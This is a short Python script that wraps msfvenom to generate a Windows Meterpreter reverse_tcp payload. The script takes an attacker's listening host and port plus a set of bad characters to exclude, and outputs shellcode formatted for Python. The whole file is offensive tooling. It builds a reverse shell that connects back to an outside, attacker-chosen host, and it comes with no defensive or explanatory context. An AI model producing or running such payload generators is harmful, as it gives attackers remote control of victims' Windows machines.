#!/usr/bin/python
#-*-coding: utf-8-*-

import subprocess 
def shell(LHOST,LPORT,CARAC):
    subprocess.call(['msfvenom','-p','windows/meterpreter/reverse_tcp','LHOST='+LHOST,'LPORT='+LPORT,'-b',CARAC,'-f' + 'python'])
 
